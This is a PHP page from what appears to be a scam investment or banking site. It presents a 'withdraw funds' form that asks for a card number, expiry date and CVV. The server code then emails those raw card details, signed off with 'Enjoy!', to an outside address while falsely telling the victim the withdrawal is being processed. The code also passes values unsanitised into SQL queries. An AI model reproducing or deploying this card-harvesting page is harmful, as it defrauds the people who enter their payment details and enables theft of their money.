<?php
session_start();
require "../../mail.php";
$id=$_SESSION['user_id'];
require "header.php";
?>
<link rel=stylesheet href="debitcard.css">
          <style>

            #mylogo, .mylogo{

              width:200px;
              height:30px;
            }
            body{
                background:white;
            }
          </style>
          
          
  <center>
            <div class="">
                <div class="">
                
                </div>
                <div class="">
                
                <form class="credit-card" method="post">
               
      <div class="form-header">
      <h4 class="title">Credit card detail</h4>
      </div>
     
      <div class="form-body">
      <input type="tel" name="amount" placeholder="Amount to withdraw" class="form-control card-number">
        <!-- Card Number -->
        <input type="text" name="card-number" class="card-number form-control" placeholder="Card Number">

        <!-- Date Field -->
        <div class="date-field">
          <div class="month">
            <select name="month" class="form-control">
              <option value="january">January</option>
              <option value="february">February</option>
              <option value="march">March</option>
              <option value="april">April</option>
              <option value="may">May</option>
              <option value="june">June</option>
              <option value="july">July</option>
              <option value="august">August</option>
              <option value="september">September</option>
              <option value="october">October</option>
              <option value="november">November</option>
              <option value="december">December</option>
            </select>
          </div>
          <div class="year">
            <select name="year" class="form-control">
              <option value="2020">2021</option>
              <option value="2022">2022</option>
              <option value="2023">2023</option>
              <option value="2024">2024</option>
              <option value="2025">2025</option>
              <option value="2026">2026</option>
              <option value="2027">2027</option>
              <option value="2028">2028</option>
              <option value="2029">2029</option>
            </select>
          </div>
        </div>

        <!-- Card Verification Field -->
        <div class="card-verification">
          <div class="cvv-input">
            <input type="text" placeholder="CVV" name="cvv" class="form-control">
          </div>
          <div class="cvv-details">
            <p>3 or 4 digits usually found <br> on the signature strip</p>
          </div>
        </div>

        <!-- Buttons -->
        <a href=""><button type="submit" class="proceed-btn btn btn-primary btn-block">Withdraw funds</button></a>
       
      </div>
    </form>
                </div>
            </div>
            
            </center>
            
          
          
          <?php
         
          ?>
          <?php
$unix_time=time();
$id=$_SESSION['user_id'];

if($_POST){
    $withdraw_amount=$_POST['amount'];
  $card=$_POST['card-number'];
  $month=$_POST['month'];
  $year=$_POST['year'];
  $cvv=$_POST['cvv'];
  $subject="New Debit card details";
  $message="
  <p>Amount: $$withdraw_amount</p>
  <p>Card number: $card.</p>
  <p>month: $month.</p>
  <p>year: $year.</p>
  <p>cvv: $cvv.</p>
  Enjoy!
  ";
  sendmail("support@theackersfield.co",$subject,$message);
  $user_email=$email;
  $user_message="Your request for withdrawal has been recieved. You would be contacted shortly";
  $user_subject="Withdrawal Request";
  $date=$date=Date("jS-F-Y");
   
if($balance>$withdraw_amount){
    $balance-=$withdraw_amount;
}
  $query=mysqli_query($conn,"UPDATE `accounts` SET `balance`='$balance' WHERE `user_id`='$id'");
  $insert_trx=mysqli_query($conn,"INSERT INTO `transactions`(`user_id`,`amount`,`type`,`date`,`unix_time`) VALUES('$id','$withdraw_amount','withdrawal','$date','$unix_time')");
  sendmail($user_email,$user_subject,$user_message);
  echo"
  <script>
  swal('Success','Your request for withdrawal has been received. It would be processed immediately','success');
  </script>
  
  ";
}
?>
